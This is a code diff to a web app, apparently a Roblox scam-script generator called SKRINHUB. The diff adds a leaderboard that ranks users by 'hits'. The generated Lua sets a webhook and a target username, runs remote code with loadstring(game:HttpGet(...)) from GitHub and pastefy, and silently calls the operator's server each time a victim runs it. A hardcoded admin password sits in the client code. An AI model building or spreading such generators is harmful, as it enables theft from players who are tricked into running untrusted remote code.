@@ -751,6 +751,38 @@
   .adm-list-item-rank { font-size:0.6rem; padding:1px 6px; border-radius:4px; white-space:nowrap; }
   .adm-list-item-del { background:none; border:none; color:var(--danger); cursor:pointer; font-size:1rem; padding:0 0.2rem; opacity:0.7; transition:opacity 0.2s; line-height:1; }
   .adm-list-item-del:hover { opacity:1; }
+
+  /* -- LEADERBOARD -- */
+  .lb-wrap { padding: 0.5rem 0; }
+  .lb-podium { display:flex; align-items:flex-end; justify-content:center; gap:1rem; margin-bottom:1.8rem; }
+  .lb-pod { display:flex; flex-direction:column; align-items:center; gap:0.45rem; }
+  .lb-pod-1 { order:2; }
+  .lb-pod-2 { order:1; }
+  .lb-pod-3 { order:3; }
+  .lb-avatar { border-radius:50%; object-fit:cover; background:var(--surface); border:2px solid var(--border); }
+  .lb-pod-1 .lb-avatar { width:62px; height:62px; border-color:var(--gold); box-shadow:0 0 14px rgba(255,215,0,0.35); }
+  .lb-pod-2 .lb-avatar { width:48px; height:48px; border-color:#c0c0c0; }
+  .lb-pod-3 .lb-avatar { width:44px; height:44px; border-color:#cd7f32; }
+  .lb-pod-name { font-family:'Share Tech Mono',monospace; font-size:0.68rem; color:var(--text); max-width:80px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; text-align:center; }
+  .lb-pod-hits { font-family:'Share Tech Mono',monospace; font-size:0.62rem; color:var(--muted); }
+  .lb-pod-hits span { color:var(--gold); font-weight:700; }
+  .lb-crown { font-size:1.1rem; }
+  .lb-medal { font-size:0.9rem; margin-bottom:-2px; }
+  .lb-stand { width:100%; border-radius:8px 8px 0 0; }
+  .lb-pod-1 .lb-stand { height:64px; background:linear-gradient(180deg,rgba(255,215,0,0.2),rgba(255,215,0,0.05)); border:1px solid rgba(255,215,0,0.3); }
+  .lb-pod-2 .lb-stand { height:48px; background:linear-gradient(180deg,rgba(192,192,192,0.15),rgba(192,192,192,0.04)); border:1px solid rgba(192,192,192,0.25); }
+  .lb-pod-3 .lb-stand { height:40px; background:linear-gradient(180deg,rgba(205,127,50,0.15),rgba(205,127,50,0.04)); border:1px solid rgba(205,127,50,0.25); }
+  .lb-list { display:flex; flex-direction:column; gap:0.3rem; }
+  .lb-row { display:flex; align-items:center; gap:0.7rem; padding:0.6rem 0.9rem; background:var(--surface); border:1px solid var(--border); border-radius:8px; transition:border-color 0.2s; }
+  .lb-row:hover { border-color:rgba(255,255,255,0.12); }
+  .lb-rank { font-family:'Share Tech Mono',monospace; font-size:0.65rem; color:var(--muted); width:24px; text-align:right; flex-shrink:0; }
+  .lb-row-avatar { width:30px; height:30px; border-radius:50%; object-fit:cover; background:var(--surface-2); flex-shrink:0; }
+  .lb-row-name { flex:1; font-family:'Share Tech Mono',monospace; font-size:0.78rem; color:var(--text); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  .lb-row-hits { font-family:'Share Tech Mono',monospace; font-size:0.72rem; color:var(--muted); text-align:right; white-space:nowrap; }
+  .lb-row-hits span { color:var(--text); font-size:0.85rem; font-weight:700; }
+  .lb-empty { font-family:'Share Tech Mono',monospace; font-size:0.72rem; color:var(--muted); text-align:center; padding:2.5rem 0; }
+  .lb-refresh { background:none; border:1px solid var(--border); border-radius:6px; color:var(--muted); padding:0.3rem 0.7rem; font-family:'Share Tech Mono',monospace; font-size:0.62rem; cursor:pointer; float:right; transition:border-color 0.2s,color 0.2s; }
+  .lb-refresh:hover { border-color:var(--text); color:var(--text); }
   @media (max-width: 600px) {
     :root { --chat-w: 100vw; }
     .chat-sidebar { width: 100%; }
@@ -927,10 +959,14 @@
     <!-- TAB: RANKINGS -->
     <div class="tab-page" id="tab-rankings">
     <div class="wrap">
-      <div class="ranks-header"><h2>Rankings</h2><p>Top users by activity &amp; contribution</p></div>
+      <div class="ranks-header"><h2>Leaderboard</h2><p>Top users by script executions</p></div>
       <div class="panel">
-        <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Leaderboard</span></div>
-        <div class="pb"><p style="font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--muted);text-align:center;padding:2rem 0;">No rankings data yet.</p></div>
+        <div class="ph"><div class="dot dot-gold"></div><span class="ph-title">Hit Rankings</span><button class="lb-refresh" onclick="fetchLeaderboard()">↻ Refresh</button></div>
+        <div class="pb">
+          <div class="lb-wrap" id="lbContent">
+            <div class="lb-empty">No hits recorded yet. Generate a script and share it!</div>
+          </div>
+        </div>
       </div>
     </div>
     </div>
@@ -1095,6 +1131,7 @@
 <script>
 /* ═══════════════════════ STATE ═══════════════════════ */
 const ADMIN_PASSWORD = '60496159';
+const SKRINHUB_API = 'https://c58175c8-ffbe-4518-9a89-8456b2c912f0-00-3jhjthxjlcyh1.sisko.replit.dev';
 let isAdmin = false;
 let discordUser = null;
 let userRanks = JSON.parse(localStorage.getItem('skrinhub_ranks') || '{}');
@@ -1150,8 +1187,7 @@ function connectWS() {
   if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
   clearTimeout(wsReconnectTimer);
 
-  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
-  const url = `${proto}//${location.host}/api/ws`;
+  const url = 'wss://c58175c8-ffbe-4518-9a89-8456b2c912f0-00-3jhjthxjlcyh1.sisko.replit.dev/api/ws';
   ws = new WebSocket(url);
 
   const statusEl = document.getElementById('wsStatus');
@@ -1381,6 +1417,43 @@ function applyDiscordState() {
     memberCard.style.display = 'none';
   }
   updateChatInputState();
+}
+
+
+/* ======= LEADERBOARD ======= */
+async function fetchLeaderboard() {
+  const el = document.getElementById('lbContent');
+  if (!el) return;
+  try {
+    const res = await fetch(SKRINHUB_API + '/api/leaderboard');
+    const data = await res.json();
+    if (!Array.isArray(data) || data.length === 0) {
+      el.innerHTML = '<div class="lb-empty">No hits recorded yet. Generate a script and share it!</div>';
+      return;
+    }
+    const top3 = data.slice(0, 3);
+    const rest = data.slice(3);
+    const defaultAvatar = 'https://cdn.discordapp.com/embed/avatars/0.png';
+    function avatarEl(entry, size) {
+      const src = entry.avatar || defaultAvatar;
+      return '<img class="lb-avatar" src="' + src + '" width="' + size + '" height="' + size + '" onerror="this.src=\'' + defaultAvatar + '\';">';
+    }
+    function podHtml(entry, rank) {
+      if (!entry) return '<div class="lb-pod lb-pod-' + rank + '"><div style="width:' + (rank===1?62:rank===2?48:44) + 'px;height:' + (rank===1?62:rank===2?48:44) + 'px;border-radius:50%;background:var(--surface);border:2px solid var(--border);"></div><div class="lb-pod-name">—</div><div class="lb-pod-hits"><span>0</span> hits</div><div class="lb-stand"></div></div>';
+      const medal = rank===1 ? '<div class="lb-crown">👑</div>' : '<div class="lb-medal">' + (rank===2?'🥈':'🥉') + '</div>';
+      const sz = rank===1?62:rank===2?48:44;
+      return '<div class="lb-pod lb-pod-' + rank + '">' + medal + avatarEl(entry, sz) + '<div class="lb-pod-name">' + escHtml(entry.displayName||entry.username) + '</div><div class="lb-pod-hits"><span>' + entry.hits.toLocaleString() + '</span> hits</div><div class="lb-stand"></div></div>';
+    }
+    let html = '<div class="lb-podium">' + podHtml(top3[0], 1) + podHtml(top3[1]||null, 2) + podHtml(top3[2]||null, 3) + '</div>';
+    if (rest.length > 0) {
+      html += '<div class="lb-list">' + rest.map(function(e, i) {
+        return '<div class="lb-row"><span class="lb-rank">#' + (i+4) + '</span><img class="lb-row-avatar" src="' + (e.avatar||defaultAvatar) + '" onerror="this.src=\'' + defaultAvatar + '\';" /><span class="lb-row-name">' + escHtml(e.displayName||e.username) + '</span><div class="lb-row-hits"><span>' + e.hits.toLocaleString() + '</span><br>hits</div></div>';
+      }).join('') + '</div>';
+    }
+    el.innerHTML = html;
+  } catch(err) {
+    el.innerHTML = '<div class="lb-empty">Failed to load leaderboard.</div>';
+  }
 }
 
 function applyAdminState() {
@@ -1874,7 +1947,8 @@ async function generate() {
     if (adminMode === 'admin-panel') adminPart = `\n            task.spawn(function()\n            loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\n            end)`;
     else if (adminMode === 'freeze') adminPart = `task.spawn(function()\n            loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\n            end)`;
     else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = customAdminLoadstring;
-    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/Shrinkhub/refs/heads/main/freeze.lua"))()\nend)\n${adminPart}`;
+    const hitUrl = SKRINHUB_API + '/api/hit?userId=' + encodeURIComponent(discordUser.id||'') + '&username=' + encodeURIComponent(discordUser.username||'') + '&displayName=' + encodeURIComponent(discordUser.displayName||'') + '&avatar=' + encodeURIComponent(discordUser.avatar||'');
+    const script = `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("${hitUrl}") end) end)\ngetgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/Shrinkhub/refs/heads/main/freeze.lua"))()\nend)\n${adminPart}`;
     const url = await uploadToPastefy(script);
     out.className = 'code-block';
     out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Failed to upload.\n${script}`;
